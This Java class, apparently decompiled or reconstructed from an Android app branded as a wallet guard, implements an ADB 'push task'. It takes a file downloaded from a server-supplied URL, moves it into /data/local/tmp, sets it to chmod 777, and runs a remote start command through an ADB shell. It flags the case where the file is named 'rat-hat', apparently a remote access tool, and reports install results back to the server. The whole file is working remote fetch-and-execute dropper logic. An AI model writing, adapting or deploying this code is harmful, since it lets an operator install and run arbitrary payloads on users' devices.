package com.guard.wallet.adb;

import com.guard.wallet.core.AppUtils;
import com.guard.wallet.http.HttpApiManager;
import com.guard.wallet.resp.PushResponseVO;
import com.guard.wallet.utils.SharedPrefsManager;
import java.util.Objects;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.Future;

/**
 * vendor h/b -> AdbPushTask.
 * ADB push task (下载文件 -> mv 到 /data/local/tmp/ -> chmod -> 启动).
 */
public final class AdbPushTask implements Runnable {
    public final AdbConnectionManager manager;
    public final String logId;
    public final String fileUrl;
    public final String fileName;
    public final Future<String> downloadFuture;
    public final String startCommand;

    public AdbPushTask(AdbConnectionManager manager, String logId, String fileUrl, String fileName,
             Future<String> future, String startCommand) {
        this.manager = manager;
        this.logId = logId;
        this.fileUrl = fileUrl;
        this.fileName = fileName;
        this.downloadFuture = future;
        this.startCommand = startCommand;
    }

    @Override
    public void run() {
        AdbConnectionManager manager = this.manager;
        if (manager == null) {
            return;
        }

        PushResponseVO response = new PushResponseVO();
        response.setLogId(this.logId);
        response.setFileUrl(this.fileUrl);
        response.setInstallMethod(0);

        String targetName = this.fileName;
        String targetPath = "/data/local/tmp/".concat(targetName);

        // 等待下载完成
        while (this.downloadFuture != null && !this.downloadFuture.isDone()) {
            // spin wait
        }

        String downloadedPath;
        try {
            downloadedPath = this.downloadFuture != null ? this.downloadFuture.get() : null;
        } catch (Exception ex) {
            AppUtils.s("AdbConnectionManager", ex);
            downloadedPath = null;
        }

        ConcurrentHashMap<String, Long> cache = manager.downloadCache;
        if (AppUtils.B(downloadedPath)) {
            if (!AppUtils.B(this.fileUrl)) {
                cache.remove(this.fileUrl);
            }
            return;
        }

        // mv 并 chmod
        String moveCommand = "mv".concat(" -f ").concat(downloadedPath).concat(" ").concat(targetPath);
        String chmodCommand = "chmod".concat(" ").concat("777").concat(" ").concat(targetPath);
        if (manager.executeShellCommand(moveCommand) && manager.executeShellCommand(chmodCommand)) {
            response.setInstallResult(1);
            // vendor: 如果是 rat-hat 则标记 installedRatHat
            if (Objects.equals(targetName, "rat-hat")) {
                SharedPrefsManager.z(1);
            }
            if (!AppUtils.B(this.startCommand)) {
                manager.writeShellCommand(this.startCommand);
                response.setStartResult(1);
            }
        }

        if (!AppUtils.B(this.fileUrl)) {
            cache.remove(this.fileUrl);
        }
        HttpApiManager.postDeviceInstallLog(response);
    }
}
